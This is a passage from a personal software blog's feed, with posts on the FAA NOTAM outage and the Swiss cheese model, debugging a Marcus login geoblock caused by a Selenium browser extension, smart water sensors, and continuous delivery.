+    <img style="max-width: 50%;" src="/assets/posts/thoughts-on-the-recent-faa-software-outage/faa-outage-news-post.png" />
+</div>
+
+<h3 id="quick-background">Quick Background</h3>
+
+<p>The system that went down provided “Notices to Air Missions”, NOTAMs these are simple text information about conditions at airports such as constructions, closed running, landing obstructions, and more. NOTAMs are used during the route planning of a flight. Once a flight airborne the NOTAMs system is not needed to complete the flight.</p>
+
+<h3 id="swish-cheese">Swish Cheese</h3>
+
+<p>There is a big difference between “who’s caused it?” and “who’s at fault? “. The individual’s actions caused the issue they are not necessarily at fault because there is normally a chain of events that lead to a issue like this. Just like aviation disasters. There might be environment factors, cultural factors, improper procedures, wrong assumes or external factors that are at fault that lead to the incident occurring. Doctor Reason’s Swiss Cheese Model illustrates this concept.</p>
+
+<div style="text-align: center;">
+    <img style="max-width: 55%;" src="/assets/posts/thoughts-on-the-recent-faa-software-outage/swiss-cheese-model.png" />
+    <div class="container-center">
+        <p>
+        Swiss cheese model by James Reason published in 2000. Source: <a href="https://openi.nlm.nih.gov/detailedresult.php?img=PMC1298298_1472-6963-5-71-1&amp;req=4" rel="nofollow">https://openi.nlm.nih.gov/detailedresult.php?img=PMC1298298_1472-6963-5-71-1&amp;req=4</a>, open-access, CC Attribution 2.0 Generic
+        </p>
+    </div>
+</div>
+
+<p>Here are the questions I have to better understand and identify where the holes in the swiss cheese happened for this incident.</p>
+
+<ul>
+  <li>Why was file change done manually? Why wasn’t it automated?</li>
+  <li>Is there a test/stage environment for testing changes?
+    <ul>
+      <li>Is the environment maintained in a similar way to prod?</li>
+      <li>Is the environment enough like Prod?</li>
+      <li>Was the action tested in the environment?
+        <ul>
+          <li>Yes. Why did it work in a pre-prod before prod? or  Why did the change move forward in prod?</li>
+          <li>No. It was not tested
+            <ul>
+              <li>Was the technician rushed?</li>
+              <li>Was it deemed a simple change a testing not need?</li>
+              <li>Was this a “common” task that happened often?</li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>If there is no prod like test environment them:
+    <ul>
+      <li>How can do you test changes?</li>
+      <li>Why is there no test environment, is it related to costs?</li>
+      <li>Was there one in the past?</li>
+    </ul>
+  </li>
+  <li>If failed, why was the backup that was restored a day old?
+    <ul>
+      <li>Was is the backup cadence?</li>
+      <li>How often is the restore process verified?</li>
+    </ul>
+  </li>
+  <li>Were proper procedures followed?
+    <ul>
+      <li>Yes. What needs to be added to the procedure for this doesn’t happen again?</li>
+      <li>No, they were not.
+        <ul>
+          <li>How many times was this type of work done not following proper procedure  without issue?</li>
+          <li>How many other individuals have not followed procedures in the past without issue?</li>
+          <li>Is there a culture of <strong><a href="https://en.wikipedia.org/wiki/Normalization_of_deviance">Normalized Deviance</a></strong> that lead to the individual think this action was normal?</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="notams-approximate-uptime">NOTAM’s Approximate Uptime</h3>
+
+<p>The NOTAM system was first introduced in 1993 and I can only find 1 instance of the system wide outage going down, the most recent one. After reading a numbers of articles there are many quotes like the one below indicating NOTAM outages are rare.</p>
+
+<blockquote>
+  <p>“I don’t ever remember the NOTAM system going down like this. I’ve been flying 53 years,” said John Cox, a former airline pilot and now an aviation-safety consultant. – <a href="https://www.cbsnews.com/dfw/news/faa-notam-definition-outage-notice-to-air-missions/">www.cbsnews.com - Irina Ivanova</a></p>
+</blockquote>
+
+<p>While the software outage started at 8:30PM ET the FAA backup phone system continued to allow departures until 7:30AM ET the next day. At this point the phone system was overwhelmed by the volume and the FAA ordered a ground stop at 7:30AM until the software system was restored at 9:30 AM ET.</p>
+
+<p>The are 262,968 hours in 30 years and if we count the backup process as part of the overall NOTAM system there was about 2.5 hours of downtime.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uptime = (262,968 - 2.5) / 262,968 * 100 = 99.999049314%
+</code></pre></div></div>
+
+<p>Look at that five-nines.</p>
+
+<p>That not to say we should brush off the outage. What happen was unacceptable and improvements need to be made to help mitigate something like this from happening again. However the reality is it will happen again. It like plane accidents, we can investigates, find the root cause, put in place fixed and mitigations, but another accident will happen It is the reality of human systems, they are flawed.</p>
+
+<h3 id="a-humbling-reminder-of-centralized-systems">A Humbling Reminder of Centralized Systems</h3>
+
+<p>This event is a humbling reminder that shows into today’s modern age of software dependencies. A single person actions, heck a single keystroke, can affect millions. It reminds me that I am in a position where I could affect clients using the sofware systems I develop and support.</p>]]></content><author><name>Nick Stanley</name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Goldman Sachs Macus Geoblock Debug</title><link href="http://0.0.0.0:4000/blog/2022/12/09/Goldman-Sachs-Macus-Geoblock-Debug" rel="alternate" type="text/html" title="Goldman Sachs Macus Geoblock Debug" /><published>2022-12-09T00:00:00-06:00</published><updated>2022-12-09T00:00:00-06:00</updated><id>http://0.0.0.0:4000/blog/2022/12/09/Goldman-Sachs-Macus-Geoblock-Debug</id><content type="html" xml:base="http://0.0.0.0:4000/blog/2022/12/09/Goldman-Sachs-Macus-Geoblock-Debug"><![CDATA[<p>Over the past few weeks I’ve been evaluating money management tools. On my list was Goldman Sachs’s Marcus. A few years ago I created a Marcus account, but at the time it didn’t fit my needs. Since then things have changed and it was time re-evaluate it.</p>
+
+<p>I attempted to login at  <a href="https://www.marcus.com/us/en/login">https://www.marcus.com/us/en/login</a> and was redirected to the following page <a href="https://www.marcus.com/US_Geoblock.html"> https://www.marcus.com/US_Geoblock.html</a> .</p>
+
+<div style="text-align: center;">
+    <img style="max-width: 72%;" src="/assets/posts/marcus-login-bug/marcus-geoblock.png" />
+</div>
+
+<p>After confirming that I was indeed in the United States, I switched from Firefox to Chrome and tried both in incognito/privacy mode and still got geoblocked. Perhaps Goldman Sachs was having temporary technical difficulties, but the flowing day the same problem happened again. Next, I wondered if it was my home network, but again I was blocked on my phone’s hotspot. Finally, I asked my friend to let me try to login on his computer at his place and the yet geoblocked.</p>
+
+<p>At this point I called Marcus support and told the agent the information above. Their first question was, “Are you on a VPN or have any VPN software installed?” To which I said “No.” <mark>The next question was "Do you have a work computer with a VPN?" I said “yes” and the agent said “Your VPN is interfering with the Marcus on your personal computer.”</mark> Dumbfounded by this revelation that my work computer’s VPN can affect requests made from my personal computer. I asked “Are you sure? My work computer is turned off.” The agent said “Yes, this only happens with VPNs”.</p>
+
+<p>I started to think the issue was my account. It had been over a year since the last login and I never opened a financial account. Maybe the Marcus account was marked as inactive and the wrong error page was being displayed. I reset my password and was auto-logged into my account, but was it consistent? I logged-out and attempted logging back in and sure enough, the same geoblock page appeared. You can see this behavior in the video below.</p>
+
+<div style="text-align: center;">
+	<video style="max-width: 95%;" controls="">
+  	<source src="/assets/posts/marcus-login-bug/MarcusBug.mp4" type="video/mp4" />
+  	Your browser does not support HTML video.
+	</video>
+</div>
+
+<p>At this point I had already ruled Marcus as money management tool to us, but I wanted to know why I couldn’t login. Whatever was resulting in the geoblock was used during the login, but not the password reset. The issue is happening on Chrome and Firefox and its happening on at least one other person’s computer. What could be the culprit?</p>
+
+<div style="text-align: center;">
+    <img style="max-width: 45%" src="/assets/images/one-hour-later.jpeg" />
+</div>
+
+<p>I realized that the problem might have to do with a browser extension. One-by-one I disabled each extension and all of a sudden no geoblock after the Selenium IDE extension was disabled. I installed the Selenium on both Chrome and Firefox and sure enough my friend also had the Selenium extension on his browser. In retrospective, the first debug step should have done to start Firefox in “add-ons Disabled” mode, but hindsight is 20-20.</p>
+
+<p>This doesn’t explain why the geoblock happens at login and not at password reset, but I have spend enough of my time debugging. The <strong>what</strong> has been found and its time to let someone at Marcus or the Selenium Project find the <strong>why</strong>. It seems doubtful this issue will be resolved because the unique and not many users would run into this problem, hopefully I am mistaken.</p>
+
+<p>This goes to show software is hard. There are many variables, moving pieces, and interconnected parts; its impossible to know how all of them are going to interact. There might be unintended side effects with every change or additional integration between systems. You simply can’t test them all. Who knows maybe one day a work computer’s VPN will affect a personal computer’s requests.</p>]]></content><author><name>Nick Stanley</name></author><summary type="html"><![CDATA[Over the past few weeks I’ve been evaluating money management tools. On my list was Goldman Sachs’s Marcus. A few years ago I created a Marcus account, but at the time it didn’t fit my needs. Since then things have changed and it was time re-evaluate it.]]></summary></entry><entry><title type="html">Water Sensors: The Smartest Home Device</title><link href="http://0.0.0.0:4000/blog/2022/03/18/water-sensors-the-smartest-home-device" rel="alternate" type="text/html" title="Water Sensors: The Smartest Home Device" /><published>2022-03-18T00:00:00-05:00</published><updated>2022-03-18T00:00:00-05:00</updated><id>http://0.0.0.0:4000/blog/2022/03/18/water-sensors-the-smartest-home-device</id><content type="html" xml:base="http://0.0.0.0:4000/blog/2022/03/18/water-sensors-the-smartest-home-device"><![CDATA[<p>The Internet-of-Things is here, light bulbs, thermostats, outlets, microwaves, fridges, dishwashers, meat thermometers, grills and much more is “smart” now. As I see it, most smart devices add complexity to life and do not make life easier. I subscribe to the idea that; <strong>My possessions should serve me. I should not serve them.</strong></p>
+
+<ul>
+  <li>Spend time updating firmware on light bulbs…nope.</li>
+  <li>Thermostat “Smart” Schedule…an analog schedule is fine.</li>
+  <li>Cooking Thermometer…get up every 10 min and check an analog one.</li>
+  <li>A Grill…see <a href="https://www.reddit.com/r/KitchenConfidential/comments/r3o76m/sending_forced_software_updates_to_a_grill_on_a/">Reddit - Software Updates a Traeger Grill on a Thanksgiving</a></li>
+</ul>
+
+<p>In addition to the hassle factor, there are privacy and security concerns that lead me to avoid IoT devices. That said, the exception I have made is for my “smart” water sensors. The brand I use consists of a central hub and many individual sensors. The app provides an option to receive email alerts. Using my personal Pagerduty account I provided the app with the Pagerduty email to allow both myself and my partner get alerts.</p>
+
+<p>A little over a year after I setup the sensors, my partner and I were woken up a Pagerduty alert at 2 in the morning. That was the moment the hot water hose under our kitchen sink decided to fail. My guess is the water was going for no more than 2 minutes before the alarm triggered, and in that time 2 to 4 gallons of water got on the kitchen floor. If we stayed asleep we would have easily woken up to an disaster.</p>
+
+<p>Smart water sensors are worth every penny and every minute I need to maintain them by updating firmware, testing them and changing their batteries. They have paid for themselves and are one of the few IoT devices on my home network.</p>]]></content><author><name>Nick Stanley</name></author><summary type="html"><![CDATA[The Internet-of-Things is here, light bulbs, thermostats, outlets, microwaves, fridges, dishwashers, meat thermometers, grills and much more is “smart” now. As I see it, most smart devices add complexity to life and do not make life easier. I subscribe to the idea that; My possessions should serve me. I should not serve them.]]></summary></entry><entry><title type="html">Continuous Delivery Sustainability First</title><link href="http://0.0.0.0:4000/blog/2021/11/05/continuous-delivery-sustainability-first" rel="alternate" type="text/html" title="Continuous Delivery Sustainability First" /><published>2021-11-05T00:00:00-05:00</published><updated>2021-11-05T00:00:00-05:00</updated><id>http://0.0.0.0:4000/blog/2021/11/05/continuous-delivery-sustainability-first</id><content type="html" xml:base="http://0.0.0.0:4000/blog/2021/11/05/continuous-delivery-sustainability-first"><![CDATA[<p>“Continuous Delivery is the ability to get changes of all types – including new features, configuration changes, bug fixes, and experiments – into prod, or into the hands of the users, safely, and quickly in a sustainable way.” –Jez Humble</p>
+
+<p>The most important word in Jez’s description of CI is <b>“suitable”</b>. In my experience, the focus on implementing CI in the same order as the sentence is structured. With the priority on getting stuff into production fast without thinking enough about long term support of the CI process. In reality you need to start with the core idea of sustainability first and make sure the system will withstand the test of time and not just short term goals.</p>
+
+<p>It’s like being a runner. You don’t just run fast you need to train, have a routine, commit to a healthy lifestyle and when you start will be slow, but you will get faster and run longer.</p>
+
+<p>Here is how I would rewrite the quote in the order of importance when implementing good CI. “Continues Delivery is the ability to get code into production in a sustainable, safe and quick way enabling changes of all types – including features, configuration change, bug fix, and experiments.</p>]]></content><author><name>Nick Stanley</name></author><summary type="html"><![CDATA[“Continuous Delivery is the ability to get changes of all types – including new features, configuration changes, bug fixes, and experiments – into prod, or into the hands of the users, safely, and quickly in a sustainable way.” –Jez Humble]]></summary></entry></feed>
